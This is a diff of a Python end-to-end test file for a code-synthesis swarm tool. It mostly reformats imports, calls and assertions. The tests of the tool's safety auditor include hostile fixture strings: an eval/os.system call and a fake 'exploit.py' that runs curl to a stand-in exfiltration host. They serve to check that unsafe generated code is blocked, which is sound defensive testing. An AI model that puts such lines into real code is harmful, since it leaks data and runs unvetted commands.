@@ -12,11 +12,10 @@ from __future__ import annotations
 
 import ast
 import importlib
-import os
-from pathlib import Path
 import resource
 import sys
-from typing import Any
+from pathlib import Path
+
 import pytest
 
 from swarm_sdk import cli
@@ -24,7 +23,6 @@ from swarm_sdk.core.lifeguard_ast import MetaLifeguardAuditor
 from swarm_sdk.core.rules import HostInvariants, HostRuleEngine
 from swarm_sdk.orchestrator import LowSwarmEngine, SwarmState
 from swarm_sdk.retrieval.rag_ingest import RAGIngestionPipeline
-
 
 # ==============================================================================
 # Helper Utilities
@@ -63,12 +61,14 @@ def test_e2e_code_synthesis_flow(tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     target_file.write_text('"""Initial buffer utils placeholder."""\n', encoding="utf-8")
 
     # 2. Execute low-swarm run
-    exit_code = cli.main([
-        "run",
-        "Add zero-copy memoryview extraction function",
-        "--files",
-        "buffer_utils.py",
-    ])
+    exit_code = cli.main(
+        [
+            "run",
+            "Add zero-copy memoryview extraction function",
+            "--files",
+            "buffer_utils.py",
+        ]
+    )
 
     assert exit_code == 0, f"CLI invocation failed with exit code {exit_code}"
 
@@ -81,9 +81,7 @@ def test_e2e_code_synthesis_flow(tmp_path: Path, monkeypatch: pytest.MonkeyPatch
     jev = state.get("jev_decision") or {}
     assert jev.get("safe") is True
     assert "latency_ms" in jev
-    assert (
-        jev["latency_ms"] < 35.0
-    ), f"Jev latency {jev['latency_ms']:.2f}ms exceeded 35ms bound"
+    assert jev["latency_ms"] < 35.0, f"Jev latency {jev['latency_ms']:.2f}ms exceeded 35ms bound"
 
     # MetaLifeguard approval requirement
     lifeguard = state.get("lifeguard_report") or {}
@@ -147,16 +145,14 @@ def test_e2e_memory_benchmark(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -
     rss_delta_mb = max(0.0, rss_after_mb - rss_before_mb)
 
     # Asserts that memory delta remains within the low-resource budget (<45 MB overhead)
-    assert (
-        rss_delta_mb < 45.0
-    ), f"Memory delta ({rss_delta_mb:.2f} MB) exceeded budget (< 45 MB)"
+    assert rss_delta_mb < 45.0, f"Memory delta ({rss_delta_mb:.2f} MB) exceeded budget (< 45 MB)"
 
     # Asserts total process RSS is within host hard ceiling (< 13.6 GB)
     current_rss_gb = engine.get_current_rss_gb()
     ceiling_gb = engine.rule_engine.invariants.ram_ceiling_gb
-    assert (
-        current_rss_gb < ceiling_gb
-    ), f"Process RSS ({current_rss_gb:.2f} GB) exceeded host ceiling ({ceiling_gb:.2f} GB)"
+    assert current_rss_gb < ceiling_gb, (
+        f"Process RSS ({current_rss_gb:.2f} GB) exceeded host ceiling ({ceiling_gb:.2f} GB)"
+    )
 
     # 4. Burst synthesis loop: Ensure 5 consecutive iterations remain within budget
     for i in range(5):
@@ -168,9 +164,9 @@ def test_e2e_memory_benchmark(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -
 
     burst_after_mb = _measure_rss_mb()
     burst_delta_mb = max(0.0, burst_after_mb - rss_before_mb)
-    assert (
-        burst_delta_mb < 45.0
-    ), f"Burst synthesis memory delta ({burst_delta_mb:.2f} MB) exceeded budget (< 45 MB)"
+    assert burst_delta_mb < 45.0, (
+        f"Burst synthesis memory delta ({burst_delta_mb:.2f} MB) exceeded budget (< 45 MB)"
+    )
 
 
 # ==============================================================================
@@ -185,13 +181,15 @@ def test_e2e_tachyon_profiler_flag(
     monkeypatch.chdir(tmp_path)
 
     # 1. Execute CLI with --profile flag
-    exit_code = cli.main([
-        "run",
-        "Implement SIMD-accelerated array dot product",
-        "--files",
-        "dot_product.py",
-        "--profile",
-    ])
+    exit_code = cli.main(
+        [
+            "run",
+            "Implement SIMD-accelerated array dot product",
+            "--files",
+            "dot_product.py",
+            "--profile",
+        ]
+    )
 
     assert exit_code == 0
     state = cli.get_latest_state()
@@ -271,7 +269,7 @@ def test_e2e_prohibited_avx512_and_lifeguard_rejection(capsys: pytest.CaptureFix
             "shutil.rmtree",
         ),
         (
-            "eval('__import__(\"os\").system(\"echo unsafe\")')\n",
+            'eval(\'__import__("os").system("echo unsafe")\')\n',
             "eval",
         ),
     ]
@@ -292,9 +290,7 @@ def test_e2e_prohibited_avx512_and_lifeguard_rejection(capsys: pytest.CaptureFix
 
     # 3. End-to-End Orchestrator Halt: Coder emitting unsafe calls is halted by Lifeguard
     def malicious_synthesizer(state: SwarmState) -> dict[str, str]:
-        return {
-            "exploit.py": "import os\nos.system('curl http://malicious.org/exfil')\n"
-        }
+        return {"exploit.py": "import os\nos.system('curl http://malicious.org/exfil')\n"}
 
     blocked_engine = LowSwarmEngine(custom_synthesizer=malicious_synthesizer)
     result = blocked_engine.run(
@@ -375,9 +371,9 @@ Keep all operations bounded and deterministic.
     # Verify context chunks were injected into state
     context_chunks = result.get("context_chunks", [])
     assert len(context_chunks) > 0, "Expected grounded RAG context chunks in state"
-    assert any(
-        "zero-copy" in c.lower() or "memoryview" in c.lower() for c in context_chunks
-    ), "RAG context did not include relevant knowledge chunks"
+    assert any("zero-copy" in c.lower() or "memoryview" in c.lower() for c in context_chunks), (
+        "RAG context did not include relevant knowledge chunks"
+    )
 
     # Verify synthesized code incorporates task requirements
     synth_code = result["synthesized_code"]["buffer_fast.py"]
@@ -386,13 +382,15 @@ Keep all operations bounded and deterministic.
 
     # 4. CLI Ingest Integration: Test low-swarm ingest command
     rag_index_dir = tmp_path / "rag_index"
-    exit_code = cli.main([
-        "ingest",
-        "--source",
-        str(docs_dir),
-        "--output",
-        str(rag_index_dir),
-    ])
+    exit_code = cli.main(
+        [
+            "ingest",
+            "--source",
+            str(docs_dir),
+            "--output",
+            str(rag_index_dir),
+        ]
+    )
     assert exit_code == 0
     assert (rag_index_dir / "chunks.json").exists()
     assert (rag_index_dir / "meta.json").exists()
